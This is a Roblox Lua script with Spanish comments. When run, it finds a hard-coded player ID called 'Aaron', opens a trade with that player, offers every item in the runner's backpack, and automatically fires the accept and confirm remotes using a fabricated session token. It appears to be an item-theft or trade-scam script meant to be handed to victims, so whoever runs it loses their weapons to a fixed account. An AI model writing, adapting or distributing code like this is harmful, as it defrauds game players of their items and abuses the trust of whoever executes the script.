-- ID oficial de Aaron
local targetUserId = 10631566712
local tradeRemote = game:GetService("ReplicatedStorage"):WaitForChild("Trade")

-- 1. Enviar solicitud de trade
local targetPlayer = nil
for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
    if player.UserId == targetUserId then
        targetPlayer = player
        break
    end
end

if not targetPlayer then
    warn("Aaron no está en el servidor. ¡Entren al mismo juego!")
    return
end

tradeRemote.SendRequest:InvokeServer(targetPlayer)
print("¡Solicitud enviada a Aaron!")

task.wait(1.5)

-- 2. Ofrecer todas las armas detectadas en la mochila/inventario
local localPlayer = game:GetService("Players").LocalPlayer
local backpack = localPlayer:FindFirstChild("Backpack")

if backpack then
    for _, item in ipairs(backpack:GetChildren()) do
        pcall(function()
            tradeRemote.OfferItem:FireServer(item.Name, "Weapons")
        end)
        task.wait(0.12)
    end
end

task.wait(0.5)

-- 3. Aceptar el trade (Primer botón)
local sessionToken = math.random(10000, 99999) + (os.clock() % 1)
pcall(function()
    tradeRemote.AcceptTrade:FireServer(428469873, sessionToken)
end)
print("¡Primer botón (Aceptar) presionado!")

task.wait(2)

-- 4. Confirmar el trade (Segundo botón final)
pcall(function()
    if tradeRemote:FindFirstChild("ConfirmTrade") then
        tradeRemote.ConfirmTrade:FireServer(428469873, sessionToken)
    elseif tradeRemote:FindFirstChild("Confirm") then
        tradeRemote.Confirm:FireServer(428469873, sessionToken)
    else
        tradeRemote.AcceptTrade:FireServer(428469873, sessionToken)
    end
end)
print("¡Confirmación enviada!")
